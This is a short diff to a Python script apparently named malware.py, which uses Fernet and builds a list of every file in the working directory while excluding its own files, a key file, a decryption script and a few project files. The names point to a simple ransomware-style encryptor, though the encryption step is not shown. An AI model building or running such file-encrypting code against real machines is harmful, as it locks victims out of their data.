@@ -3,7 +3,7 @@ from cryptography.fernet import Fernet
 
 files = []
 for file in os.listdir():
-    if file in ('malware.py', 'thekey.key', 'decrypt.py'):
+    if file in ('malware.py', 'thekey.key', 'decrypt.py', '.gitigore', 'requirements.txt'):
         continue
     if os.path.isfile(file):
         files.append(file)
